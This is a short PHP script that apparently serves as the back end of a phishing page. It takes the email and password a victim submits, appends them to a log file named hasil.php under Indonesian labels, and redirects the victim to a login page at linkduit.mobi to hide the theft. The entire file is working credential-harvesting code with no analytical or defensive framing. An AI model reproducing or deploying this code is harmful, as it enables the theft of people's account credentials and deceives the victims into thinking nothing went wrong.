<?php
header ("Location: https://linkduit.mobi/user/login");
$ADEx = "hasil.php";
$ADEy = $_POST['email'];
$ADEz = $_POST['password'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email              : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
